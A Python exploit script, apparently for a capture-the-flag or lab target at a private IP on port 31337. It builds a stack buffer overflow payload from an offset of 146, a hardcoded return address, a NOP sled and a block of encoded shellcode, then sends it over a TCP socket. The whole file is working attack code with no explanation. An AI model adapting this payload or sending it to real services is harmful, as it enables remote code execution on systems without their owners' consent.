#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.176.224"
port = 31337

crashed_pt = 160

prefix = b""
offset = 146
overflow = b"A" * offset
retn = b"\xc3\x14\x04\x08"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

buf =  b""
buf += b"\xba\xde\x87\x6d\x84\xda\xc8\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x5e\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2"
buf += b"\x2b\x7b\x85\x0b\xd3\x84\x56\x74\xe2\x56\xdf\x91\x60"
buf += b"\xdc\xb2\x69\xe3\xb0\x3e\x01\xa1\x20\xb4\x67\x6d\x46"
buf += b"\x7d\xcd\x4b\x69\x7e\xe3\x53\x25\xbc\x65\x2f\x34\x91"
buf += b"\x45\x0e\xf7\xe4\x84\x57\x41\x82\x69\x05\xd9\x3e\x66"
buf += b"\x22\x9f\x82\xd1\x35\xf0\x70\x9d\x4d\x75\x46\x6a\xe1"
buf += b"\x74\x97\x18\xb1\x6e\x47\x94\x19\xaf\x66\x79\x1c\x66"
buf += b"\x1c\x41\x57\x48\x22\x32\x53\x21\xdd\x93\xaa\xf5\x72"
buf += b"\xda\x03\xf8\x8b\x1a\xa3\xe3\xf9\x50\xd0\x9e\xf9\xa2"
buf += b"\xab\x44\x8f\x34\x0b\x0e\x37\x91\xaa\xc3\xae\x52\xa0"
buf += b"\xa8\xa5\x3d\xa4\x2f\x69\x36\xd0\xa4\x8c\x99\x51\xfe"
buf += b"\xaa\x3d\x3a\xa4\xd3\x64\xe6\x0b\xeb\x77\x4e\xf3\x49"
buf += b"\xf3\x7c\xe2\xee\xfc\x7f\x0b\xb3\x6a\x4c\xc6\x4c\x6b"
buf += b"\xda\x51\x3e\x59\x45\xca\xa8\xd1\x0e\xd4\x2f\x63\x18"
buf += b"\xe7\xe0\xcb\x48\x19\x01\x2c\x41\xde\x55\x7c\xf9\xf7"
buf += b"\xd5\x17\xf9\xf8\x03\x8d\xf3\x6e\xa6\x5a\x73\x92\xde"
buf += b"\x58\x73\x7d\x43\xd4\x95\x2d\x2b\xb6\x09\x8e\x9b\x76"
buf += b"\xf9\x66\xf6\x78\x26\x96\xf9\x52\x4f\x3d\x16\x0b\x38"
buf += b"\xaa\x8f\x16\xb2\x4b\x4f\x8d\xbf\x4c\xdb\x24\x40\x02"
buf += b"\x2c\x4c\x52\x73\x4b\xae\xaa\x84\xfe\xae\xc0\x80\xa8"
buf += b"\xf9\x7c\x8b\x8d\xce\x23\x74\xf8\x4c\x23\x8a\x7d\x65"
buf += b"\x58\xbd\xeb\xc9\x36\xc2\xfb\xc9\xc6\x94\x91\xc9\xae"
buf += b"\x40\xc2\x99\xcb\x8e\xdf\x8d\x40\x1b\xe0\xe7\x35\x8c"
buf += b"\x88\x05\x60\xfa\x16\xf5\x47\x78\x50\x09\x1a\x57\xf9"
buf += b"\x62\xe4\xe7\xf9\x72\x8e\xe7\xa9\x1a\x45\xc7\x46\xeb"
buf += b"\xa6\xc2\x0e\x63\x2d\x83\xfd\x12\x32\x8e\xa0\x8a\x33"
buf += b"\x3d\x79\x3c\x4e\x4e\x7e\xbd\xaf\x46\x1b\xbd\xb0\x66"
buf += b"\x1d\x81\x67\x5f\x6b\xc4\xb4\xe4\x74\xdb\x10\x11\x1d"
buf += b"\x42\xf1\x98\x40\x75\x2c\xde\x7c\xf6\xc4\x9f\x7a\xe6"
buf += b"\xad\x9a\xc7\xa0\x5e\xd7\x58\x45\x60\x44\x58\x4c"


shellcode = buf

chars = b"C"*(crashed_pt - offset - len(retn) - len(padding) - len(shellcode))

#postfix = b""

payload = prefix + overflow + retn + padding + shellcode + chars #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
